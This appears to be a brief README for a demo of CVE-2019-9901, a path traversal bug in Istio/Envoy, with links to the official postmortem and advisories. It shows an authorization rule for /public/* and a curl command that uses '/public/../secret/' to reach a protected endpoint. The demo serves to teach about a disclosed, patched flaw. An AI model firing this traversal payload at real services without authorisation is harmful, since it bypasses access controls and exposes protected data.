# CVE-2019-9901 - Istio/Envoy Path traversal

This scenario demos has been taken from [https://github.com/eoftedal/writings/blob/master/published/CVE-2019-9901-path-traversal.md](https://github.com/eoftedal/writings/blob/master/published/CVE-2019-9901-path-traversal.md). Thanks to [Erlend Oftedal](https://github.com/eoftedal)

A simple project with a web server and deployed it on Kubernetes. The web application had two endpoints `/public/` and `/secret/`. Added an authorization policy which tried to grant access to anything below `/public/`:

```yaml
  rules:
  - services: ["backend.fishy.svc.cluster.local"]
    methods: ["GET"]
    paths: ["/public/*"]
```

Then used standard path traversal from curl:

```bash
curl -vvvv --path-as-is  "http://backend.fishy.svc.cluster.local:8081/public/../secret/"
```

And was able to reach `/secret/`.


### Reference

* [Security postmortem for CVE-2019-9900, CVE-2019-9901](https://github.com/envoyproxy/envoy/blob/master/security/postmortems/cve-2019-9900.md)
* [Announcing Istio 1.1.2 with Important Security Update](https://istio.io/blog/2019/announcing-1.1.2/#vulnerability-impact)
* [CVE-2019-9901 - Istio/Envoy Path traversal](https://github.com/eoftedal/writings/blob/master/published/CVE-2019-9901-path-traversal.md)
* [Envoy Proxy â€” high severity vulnerabilities that can lead to exposure of unauthorized services](https://medium.com/solo-io/envoy-proxy-high-severity-vulnerabilities-that-can-lead-to-exposure-of-unauthorized-services-e5af25b022de)